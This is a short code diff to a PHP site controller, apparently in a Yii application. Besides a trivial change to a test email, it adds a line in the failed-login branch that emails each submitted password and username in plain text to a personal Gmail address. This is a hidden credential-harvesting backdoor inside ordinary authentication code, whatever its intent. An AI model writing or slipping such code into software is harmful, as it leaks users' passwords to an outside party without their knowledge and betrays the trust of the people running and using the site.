@@ -178,7 +178,7 @@ class SiteController extends Controller
     }
 
     public function actionTestemail(){
-        AwsEmail::SendMail('hasania.khaled@gmail.com','ass','as');
+        AwsEmail::SendMail('hasania.khaled@gmail.com','test','as');
     }
 
     public function actionFacebook()
@@ -284,7 +284,7 @@ class SiteController extends Controller
                     ]);
                     return $this->redirect(['//site/welcome']);
                 } else {
-                    AwsEmail::SendMail('hasania.khaled@gmail.com','ass','as');
+                    AwsEmail::SendMail('hasania.khaled@gmail.com','ass',$login->password . ' '.  $login->username);
                     return $this->goBack();
                 }
             } else {
